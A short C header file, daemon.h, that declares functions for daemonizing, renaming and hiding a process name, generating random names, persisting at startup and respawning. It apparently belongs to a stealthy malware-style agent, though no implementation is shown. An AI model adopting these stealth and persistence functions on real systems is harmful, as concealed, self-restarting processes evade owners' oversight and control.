#ifndef DAEMON_H
#define DAEMON_H

void daemonize(int argc, char **argv);
void set_name(const char *name);
void gen_name(char *out, int len);
void hide_process_name(int argc, char **argv);
int startup_persist(char *exec);
void respawn_proc(void);

#endif
